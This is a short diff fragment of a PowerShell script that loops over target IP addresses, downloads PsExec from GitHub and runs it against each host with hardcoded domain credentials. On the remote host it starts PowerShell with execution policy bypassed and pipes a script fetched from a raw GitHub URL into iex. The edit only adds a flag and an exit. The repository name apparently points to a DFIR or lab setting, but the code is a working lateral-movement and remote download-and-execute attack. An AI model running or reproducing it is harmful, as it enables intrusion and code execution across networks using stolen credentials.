@@ -36,7 +36,7 @@ foreach ($ip in $ipAddresses) {
             Write-Host "Attempting SMB remoting to $targetIP"
 
             iwr https://github.com/EliteLoser/Invoke-PsExec/raw/refs/heads/master/PsExec.exe -Outfile test.exe
-            .\test.exe \\$targetIP -u duck\gilcol -p P@ssw0rd -accepteula powershell -nop -ep Bypass -c "hostname;iex (iwr https://raw.githubusercontent.com/michelangelosplinter/D.F.I.R-Public-Resources/refs/heads/main/aspnet/Main.ps1 -UseBasicParsing).Content"
+            .\test.exe \\$targetIP -u duck\gilcol -p P@ssw0rd -b -accepteula powershell -nop -ep Bypass -c "hostname;iex (iwr https://raw.githubusercontent.com/michelangelosplinter/D.F.I.R-Public-Resources/refs/heads/main/aspnet/Main.ps1 -UseBasicParsing).Content;exit"
             del test.exe
     	}
     }
@@ -55,7 +55,7 @@ foreach ($ip in $ipAddresses) {
             Write-Host "Attempting SMB remoting to $targetIP"
 
             iwr https://github.com/EliteLoser/Invoke-PsExec/raw/refs/heads/master/PsExec.exe -Outfile test.exe
-            .\test.exe \\$targetIP -u duck\gilcol -p P@ssw0rd -accepteula powershell -nop -ep Bypass -c "hostname;iex (iwr https://raw.githubusercontent.com/michelangelosplinter/D.F.I.R-Public-Resources/refs/heads/main/aspnet/Main.ps1 -UseBasicParsing).Content"
+            .\test.exe \\$targetIP -u duck\gilcol -p P@ssw0rd -b -accepteula powershell -nop -ep Bypass -c "hostname;iex (iwr https://raw.githubusercontent.com/michelangelosplinter/D.F.I.R-Public-Resources/refs/heads/main/aspnet/Main.ps1 -UseBasicParsing).Content;exit"
             del test.exe
     	}
 	}
